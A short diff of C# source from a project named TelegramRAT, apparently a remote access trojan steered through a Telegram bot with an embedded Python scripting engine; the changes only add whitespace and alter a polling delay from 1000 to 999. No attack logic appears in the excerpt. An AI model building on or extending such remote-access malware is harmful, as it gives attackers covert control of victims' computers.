@@ -25,7 +25,7 @@ using Telegram.Bot.Types.ReplyMarkups;
 
 
 namespace TelegramRAT
-{
+{ 
     public static class Program
     {
         static TelegramBotClient Bot;
@@ -40,7 +40,7 @@ namespace TelegramRAT
         static ScriptEngine PythonEngine;
         static ScriptRuntime PythonRuntime;
 
-        static int PollingDelay = 1000;
+        static int PollingDelay = 999;
 
         static void Main(string[] args)
         {
